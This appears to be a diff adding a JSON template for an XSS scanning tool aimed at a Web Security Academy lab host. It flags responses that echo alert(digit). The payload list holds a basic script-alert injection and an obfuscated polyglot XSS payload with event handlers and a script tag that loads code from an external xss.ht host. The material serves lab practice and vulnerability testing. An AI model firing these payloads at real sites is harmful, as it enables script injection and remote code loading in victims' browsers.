@@ -1,0 +1,30 @@
+{
+    "id":"xss",
+    "url":"",
+    "severity":"high",
+    "request":{
+        "method":"GET",
+        "payloads":true,
+        "redirects":"",
+        "headers":{
+            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept-Encoding":"gzip, deflate",
+            "Accept-Language":"en-US,en;q=0.5",
+            "Connection":"keep-alive",
+            "Host":"0ab50011036711aec1a01773003a00df.web-security-academy.net",
+            "User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:10.0.2) Gecko/20100101 Firefox/10.0.2"
+        }
+    },
+    "stopAtMatch": true,
+    "matchers-condition": "or",
+    "matches": [
+        {
+            "type": "regex",
+            "part": "body",
+            "regex": "alert\\(\\d\\)"
+        }
+    ],
+    "payloads":["<script>alert(1)</script>",
+    "''onclick=(co\u006efirm)?.`0`><sVg/i=oNload=(pro\u006dpt)`1`></svG/</sTyle/</scripT/</textArea/</iFrame/</noScript/</seLect/--><h1><iMg/srC/onerror=alert`2`>%22%3E%3CSvg/onload=confirm`3`//<Script/src=//xhzeem.xSs.ht></scripT>"]
+
+}
